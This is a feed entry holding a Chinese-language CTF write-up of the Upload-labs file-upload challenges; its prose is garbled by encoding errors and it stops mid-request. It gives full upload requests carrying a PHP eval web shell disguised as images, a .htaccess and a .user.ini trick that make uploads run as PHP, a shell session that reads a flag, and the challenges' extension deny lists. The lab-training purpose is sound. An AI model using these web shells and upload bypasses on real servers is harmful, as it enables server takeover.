    <link href="http://example.com/2024/02/19/Upload-labs/"/>
    <id>http://example.com/2024/02/19/Upload-labs/</id>
    <published>2024-02-19T13:40:48.000Z</published>
    <updated>2024-02-23T07:59:31.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>ç½‘ä¸Šæœ‰21å…³çš„å’Œ20å…³ä¸¤ç§,åœ¨è¿™é‡Œä»¥buu upload-labs linux ä¹Ÿå°±æ˜¯20å…³çš„æ¥æ’åº,å¹¶ä¸”åœ¨æœ¬åœ°æ­å»ºäº†21å…³çš„labs</p><p>å³åŒ…å«äº†21å…³å…¨éƒ¨å†…å®¹</p><h2 id="Pass-01-å‰ç«¯éªŒè¯"><a href="#Pass-01-å‰ç«¯éªŒè¯" class="headerlink" title="Pass-01(å‰ç«¯éªŒè¯)"></a>Pass-01(å‰ç«¯éªŒè¯)</h2><p>ç®€å•çš„å‰ç«¯jséªŒè¯</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>316</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryKhKT7v8SLthN7HCS</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81/Pass-01/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[nacl]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>ä¹‹åèšå‰‘è¿æ¥å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(*) åŸºç¡€ä¿¡æ¯</span><br><span class="line">å½“å‰è·¯å¾„: /var/www/html/upload</span><br><span class="line">ç£ç›˜åˆ—è¡¨: /</span><br><span class="line">ç³»ç»Ÿä¿¡æ¯: Linux out 4.19.221-0419221-generic <span class="comment">#202112141049 SMP Tue Dec 14 11:54:51 UTC 2021 x86_64</span></span><br><span class="line">å½“å‰ç”¨æˆ·: www-data</span><br><span class="line">(*) è¾“å…¥ ashelp æŸ¥çœ‹æœ¬åœ°å‘½ä»¤</span><br><span class="line">(www-data:/var/www/html/upload) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">init-scripts</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/) $ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;2e4c9e92-0a87-448f-816b-7dd80815b03e&#125;</span><br><span class="line">(www-data:/) $</span><br></pre></td></tr></table></figure><h2 id="Pass-02-MIMEç»•è¿‡"><a href="#Pass-02-MIMEç»•è¿‡" class="headerlink" title="Pass-02(MIMEç»•è¿‡)"></a>Pass-02(MIMEç»•è¿‡)</h2><p>æ­¤é¢˜ä¸ºmimeç»•è¿‡,ç”±äºç¬¬ä¸€é¢˜æˆ‘ä»¬ä¹Ÿå°†mimeæ›´æ”¹äº†æ‰€ä»¥ä¸ç¬¬ä¸€é¢˜pocç›¸åŒ</p><h2 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03(é»‘åå•ç»•è¿‡)"></a>Pass-03(é»‘åå•ç»•è¿‡)</h2><p>è¿™å…³ä¸ºé»‘åå•éªŒè¯,ä½†æ˜¯é»‘åå•å¹¶ä¸å…¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨.phtmlç­‰ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220135850240.png" alt="image-20240220135850240"></p><h2 id="Pass-04-htaccessç»•è¿‡é»‘åå•"><a href="#Pass-04-htaccessç»•è¿‡é»‘åå•" class="headerlink" title="Pass-04(.htaccessç»•è¿‡é»‘åå•)"></a>Pass-04(.htaccessç»•è¿‡é»‘åå•)</h2><p>ä»ç„¶æ˜¯é»‘åå•,ä½†æ˜¯å¢åŠ äº†ä¸å°‘phpçš„åç¼€,ä¸è¿‡å¯ä»¥å¯ä»¥ä¸Šä¼ .htaccessæ¥ç»•è¿‡</p><p>.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php?action=show_code</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>380</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryAlCaT8MY9dXGKBFo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;FilesMatch &quot;png&quot;&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">  SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">ä¸Šä¼ </span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarycJmFOOAI4Dq9bwue</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.png&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220141436068.png" alt="image-20240220141436068"></p><h2 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05(å¤§å°å†™ç»•è¿‡)"></a>Pass-05(å¤§å°å†™ç»•è¿‡)</h2><p>åˆç¦äº†.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ²¡æœ‰ç¦.php7ä½†æ˜¯è¿™é‡Œä¸Šä¼ .php7å¹¶ä¸èƒ½è¢«è§£æ</p><p>æŸ¥çœ‹æºç ä¸å‰å‡ å…³å¯¹æ¯” å‘ç°è¿™é‡Œå¹¶æ²¡æœ‰ä¸‹é¢è¿™è¡Œ å°†æ–‡ä»¶åç¼€åç»Ÿä¸€è½¬æ¢ä¸ºå°å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ .phPæ¥ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142700111.png" alt="image-20240220142700111"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142713513.png" alt="image-20240220142713513"></p><h2 id="buu-upload-labs-windows-Pass-05-user-iniç»•è¿‡"><a href="#buu-upload-labs-windows-Pass-05-user-iniç»•è¿‡" class="headerlink" title="(buu upload-labs windows)Pass-05(.user.iniç»•è¿‡)"></a>(buu upload-labs windows)Pass-05(.user.iniç»•è¿‡)</h2><p>è¿™å…³åœ¨BUU upload-labs windowsä¸­,ç¦äº†.htaccess</p><p>ä½†åœ¨upload&#x2F;ä¸‹å­˜åœ¨ä¸€ä¸ªreadme.php, å¹¶ä¸”æ²¡æœ‰ç¦.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220145259013.png" alt="image-20240220145259013"></p><p>å› æ­¤å¯ä»¥æ„é€ .user.iniæ¥ä½¿readme.phpåŒ…å«æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶</p><blockquote><p> php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªphp.iniï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚ </p><p><strong>å®ä¾‹</strong></p><p>php é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨</p><blockquote><p>auto_prepend_file &#x3D; <filename>     &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å¤´<br>auto_append_file &#x3D; <filename>      &#x2F;&#x2F;åŒ…å«åœ¨æ–‡ä»¶å°¾</p></blockquote><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg</span><br></pre></td></tr></table></figure><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œbuuçš„window upload-labsé¶æœºä¼¼ä¹æœ‰ç‚¹é—®é¢˜,æ‰€ä»¥æˆ‘å°±åœ¨æœ¬åœ°windowç¯å¢ƒæ­å»ºäº†ä¸€ä¸ªé¶æœºè¿›è¡Œæµ‹è¯•</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary04B3H7j2HCxrhZa6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span 